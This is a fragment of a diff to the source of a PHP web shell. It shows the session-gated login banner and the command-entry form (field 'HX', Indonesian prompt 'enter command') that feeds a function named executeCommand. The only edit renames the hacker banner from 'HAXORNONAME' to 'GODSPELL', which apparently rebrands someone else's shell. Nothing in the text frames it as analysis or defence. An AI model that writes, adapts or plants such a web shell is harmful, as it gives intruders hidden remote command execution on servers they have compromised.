@@ -181,7 +181,7 @@ function executeCommand($command) {
 </head>
 <body>
     <div class="container">
-        <h1><?php echo isset($_SESSION['password']) ? 'WELCOME HAXORNONAME' : 'LOGIN TO ACCESS'; ?></h1>
+        <h1><?php echo isset($_SESSION['password']) ? 'WELCOME GODSPELL' : 'LOGIN TO ACCESS'; ?></h1>
         <?php if (isset($_SESSION['password']) && $_SESSION['password'] == $password) : ?>
             <form class="cmd" action="" method="GET">
                 $ <input type="text" name="HX" placeholder="Masukkan perintah"> <br>
